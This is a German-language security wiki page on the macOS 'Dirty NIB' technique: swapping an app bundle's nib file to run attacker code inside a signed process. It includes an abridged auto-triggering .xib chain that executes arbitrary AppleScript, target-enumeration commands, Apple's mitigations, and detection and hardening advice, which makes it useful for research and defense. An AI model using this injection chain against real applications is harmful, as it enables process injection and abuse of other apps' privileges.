# macOS Dirty NIB

{{#include ../../../banners/hacktricks-training.md}}

Dirty NIB bezeichnet den Missbrauch von Interface-Builder-Dateien (.xib/.nib) innerhalb eines signierten macOS-App-Bundles, um vom Angreifer kontrollierte Logik innerhalb des Zielprozesses auszuführen und dadurch dessen Entitlements und TCC-Berechtigungen zu übernehmen. Diese Technik wurde ursprünglich von xpn (MDSec) dokumentiert und später von Sector7 verallgemeinert und erheblich erweitert. Sector7 behandelte außerdem Apples Mitigations in macOS 13 Ventura und macOS 14 Sonoma.<sup>[[1]](#references)[[2]](#references)</sup> Hintergrundinformationen und ausführliche Analysen finden sich in den Referenzen am Ende.

> Kurz gesagt
> • Vor macOS 13 Ventura: Das Ersetzen der MainMenu.nib eines Bundles (oder einer anderen beim Start geladenen nib) konnte zuverlässig eine Prozessinjektion und häufig auch eine Privilege Escalation ermöglichen.
> • Seit macOS 13 (Ventura) und mit Verbesserungen in macOS 14 (Sonoma): Die Verifizierung beim ersten Start, der Bundle-Schutz, Launch Constraints und die neue TCC-Berechtigung „App Management“ verhindern weitgehend das nachträgliche Manipulieren von nibs durch nicht verwandte Apps. Angriffe können in speziellen Fällen weiterhin möglich sein (z. B. bei Same-Developer-Tools, die eigene Apps modifizieren, oder bei Terminals, denen der Benutzer App Management/Full Disk Access gewährt hat).


## Was sind NIB/XIB-Dateien

Nib-Dateien (kurz für NeXT Interface Builder) sind serialisierte UI-Objektgraphen, die von AppKit-Apps verwendet werden. Modernes Xcode speichert bearbeitbare XML-.xib-Dateien, die beim Build-Vorgang in .nib kompiliert werden. Eine typische App lädt ihre Hauptoberfläche über `NSApplicationMain()`, das den Schlüssel `NSMainNibFile` aus der Info.plist der App liest und den Objektgraphen zur Laufzeit instanziiert.

Wichtige Punkte, die den Angriff ermöglichen:
- Das Laden von NIBs instanziiert beliebige Objective-C-Klassen, ohne dass diese NSSecureCoding implementieren müssen (Apples NIB-Loader greift auf `init`/`initWithFrame:` zurück, wenn `initWithCoder:` nicht verfügbar ist).
- Cocoa Bindings können missbraucht werden, um Methoden aufzurufen, während NIBs instanziiert werden, einschließlich verketteter Aufrufe, die keine Benutzerinteraktion erfordern.


## Dirty NIB injection process (attacker view)

Der klassische Ablauf vor Ventura:
1) Eine bösartige .xib erstellen
- Ein `NSAppleScript`-Objekt (oder andere „Gadget“-Klassen wie `NSTask`) hinzufügen.
- Ein `NSTextField` hinzufügen, dessen Titel den Payload enthält (z. B. AppleScript oder Command-Argumente).
- Ein oder mehrere `NSMenuItem`-Objekte hinzufügen, die über Bindings so verbunden werden, dass sie Methoden auf dem Zielobjekt aufrufen.

2) Automatischer Trigger ohne Benutzerklicks
- Bindings verwenden, um Target/Selector eines Menüeintrags zu setzen und anschließend die private Methode `_corePerformAction` aufzurufen, sodass die Action automatisch ausgeführt wird, wenn die NIB geladen wird. Dadurch ist kein Benutzerklick auf einen Button erforderlich.

Minimales Beispiel einer Auto-Trigger-Kette innerhalb einer .xib (der Übersichtlichkeit halber gekürzt):
```xml
<objects>
<customObject id="A1" customClass="NSAppleScript"/>
<textField id="A2" title="display dialog \"PWND\""/>
<!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
<menuItem id="C1">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="initWithSource:"/>
<binding name="Argument" destination="A2" keyPath="title"/>
</connections>
</menuItem>
<!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
<menuItem id="C2">
<connections>
<binding name="target" destination="A1"/>
<binding name="selector" keyPath="executeAndReturnError:"/>
</connections>
</menuItem>
<!-- Triggers that auto‑press the above menu items at load time -->
<menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
<menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
</objects>
```
Dies ermöglicht die Ausführung beliebiger AppleScript-Befehle im Zielprozess beim Laden des nib.<sup>[[1]](#references)</sup> Fortgeschrittene Chains können:
- Beliebige AppKit-Klassen instanziieren (z. B. `NSTask`) und Methoden ohne Argumente wie `-launch` aufrufen.
- Beliebige Selektoren mit Objektargumenten über den oben beschriebenen Binding-Trick aufrufen.
- AppleScriptObjC.framework laden, um eine Bridge zu Objective-C herzustellen und sogar ausgewählte C APIs aufzurufen.
- Auf älteren Systemen, die noch Python.framework enthalten, eine Bridge zu Python herstellen und anschließend `ctypes` verwenden, um beliebige C-Funktionen aufzurufen (Forschung von Sector7).<sup>[[2]](#references)</sup>

3) Das nib der App ersetzen
- target.app an einen beschreibbaren Speicherort kopieren, z. B. `Contents/Resources/MainMenu.nib` durch das bösartige nib ersetzen und target.app ausführen. Vor Ventura führten nach einer einmaligen Gatekeeper-Bewertung nachfolgende Starts nur oberflächliche Signaturprüfungen durch, sodass nicht ausführbare Ressourcen (wie .nib) nicht erneut validiert wurden.

Beispiel für ein AppleScript-Payload für einen sichtbaren Test:
```applescript
set theDialogText to "PWND"
display dialog theDialogText
```
## Moderne macOS-Schutzmechanismen (Ventura/Monterey/Sonoma/Sequoia)

Apple führte mehrere systemweite Mitigations ein, die die Einsatzfähigkeit von Dirty NIB unter modernen macOS-Versionen drastisch reduzieren:<sup>[[2]](#references)</sup>
- Tiefgehende Verifizierung beim ersten Start und Bundle-Schutz (macOS 13 Ventura)
- Beim ersten Start jeder App (unter Quarantäne oder nicht) deckt eine tiefgehende Signaturprüfung alle Bundle-Ressourcen ab. Danach wird das Bundle geschützt: Nur Apps desselben Entwicklers (oder Apps, die von der App ausdrücklich erlaubt wurden) dürfen dessen Inhalte ändern. Andere Apps benötigen die neue TCC-Berechtigung „App Management“, um in das Bundle einer anderen App zu schreiben.
- Launch Constraints (macOS 13 Ventura)
- System-/Apple-Bundled-Apps können nicht an einen anderen Ort kopiert und dort gestartet werden; dadurch wird der Ansatz „nach /tmp kopieren, patchen, ausführen“ für OS-Apps verhindert.
- Verbesserungen in macOS 14 Sonoma
- Apple verschärfte App Management und behob bekannte Bypasses (z. B. CVE‑2023‑40450), auf die Sector7 hingewiesen hat. Python.framework wurde bereits früher entfernt (macOS 12.3), wodurch einige Privilege-Escalation-Ketten nicht mehr funktionieren.
- Änderungen an Gatekeeper/Quarantine
- Eine umfassendere Diskussion über Gatekeeper, Provenance und Änderungen an der Bewertung, die diese Technik beeinflusst haben, findest du auf der unten referenzierten Seite.

> Praktische Auswirkung
> • Unter Ventura+ kannst du das .nib einer Drittanbieter-App im Allgemeinen nicht ändern, sofern dein Prozess nicht über App Management verfügt oder dieselbe Team ID wie das Ziel besitzt (z. B. bei Developer-Tools).
> • Die Vergabe von App Management oder Full Disk Access an Shells/Terminals öffnet diese Angriffsfläche praktisch erneut für alles, was Code innerhalb des Kontexts dieses Terminals ausführen kann.


### Umgang mit Launch Constraints

Launch Constraints verhindern ab Ventura die Ausführung vieler Apple-Apps von nicht standardmäßigen Speicherorten. Wenn du auf Workflows aus der Zeit vor Ventura angewiesen warst, bei denen eine Apple-App in ein temporäres Verzeichnis kopiert, `MainMenu.nib` geändert und anschließend gestartet wurde, musst du damit rechnen, dass dies unter >= 13.0 fehlschlägt.


## Auflisten von Zielen und nibs (nützlich für Forschung / Legacy-Systeme)

- Apps finden, deren UI nib-gesteuert ist:
```bash
find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
```
- Kandidaten für nib-Ressourcen innerhalb eines Bundles finden:
```bash
find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
```
- Code-Signaturen eingehend validieren (schlägt fehl, wenn du Ressourcen manipuliert und nicht neu signiert hast):
```bash
codesign --verify --deep --strict --verbose=4 target.app
```
> Hinweis: Auf modernen macOS-Versionen werden Sie beim Versuch, ohne entsprechende Autorisierung in das Bundle einer anderen App zu schreiben, ebenfalls durch Bundle-Schutz/TCC blockiert.


## Erkennung und DFIR-Hinweise

- Überwachung der Dateiintegrität von Bundle-Ressourcen
- Achten Sie auf Änderungen von mtime/ctime an `Contents/Resources/*.nib` und anderen nicht ausführbaren Ressourcen in installierten Apps.
- Unified Logs und Prozessverhalten
- Überwachen Sie auf unerwartete AppleScript-Ausführung innerhalb von GUI-Apps sowie auf Prozesse, die AppleScriptObjC oder Python.framework laden. Beispiel:
```bash
log stream --info --predicate 'processImagePath CONTAINS[cd] ".app/Contents/MacOS/" AND (eventMessage CONTAINS[cd] "AppleScript" OR eventMessage CONTAINS[cd] "loadAppleScriptObjectiveCScripts")'
```
- Proaktive Prüfungen
- Führen Sie regelmäßig `codesign --verify --deep` für wichtige Apps aus, um sicherzustellen, dass Ressourcen intakt bleiben.
- Privilegienkontext
- Prüfen Sie, wer oder was über TCC-Berechtigungen für „App Management“ oder Full Disk Access verfügt (insbesondere Terminals und Management-Agents). Das Entfernen dieser Berechtigungen aus allgemeinen Shells verhindert das triviale erneute Aktivieren von Dirty-NIB-artiger Manipulation.


## Defensive Härtung (Entwickler und Verteidiger)

- Bevorzugen Sie programmatische UI oder beschränken Sie, was aus NIBs instanziiert wird. Vermeiden Sie leistungsfähige Klassen (z. B. `NSTask`) in NIB-Graphen und Bindings, die indirekt Selector auf beliebigen Objekten aufrufen.
- Verwenden Sie die Hardened Runtime mit Library Validation (bei modernen Apps bereits Standard). Dies verhindert zwar keine NIB-Injection an sich, blockiert jedoch das einfache Laden nativen Codes und zwingt Angreifer zu rein auf Scripting basierenden Payloads.
- Fordern Sie in allgemeinen Tools keine weitreichenden App-Management-Berechtigungen an und hängen Sie nicht davon ab. Wenn MDM App Management erfordert, trennen Sie diesen Kontext von benutzergesteuerten Shells.
- Überprüfen Sie regelmäßig die Integrität Ihres App-Bundles und sorgen Sie dafür, dass Ihre Update-Mechanismen Bundle-Ressourcen selbstständig reparieren.


## Weiterführende Informationen in HackTricks

Erfahren Sie mehr über Gatekeeper, Quarantäne- und Provenance-Änderungen, die diese Technik beeinflussen:

{{#ref}}
../macos-security-protections/macos-gatekeeper.md
{{#endref}}


## Referenzen

- [1] [xpn – DirtyNIB (ursprünglicher Write-up mit Pages-Beispiel)](https://blog.xpnsec.com/dirtynib/)
- [2] [Sector7 – Bringing process injection into view(s): exploiting all macOS apps using nib files (5. April 2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)

{{#include ../../../banners/hacktricks-training.md}}
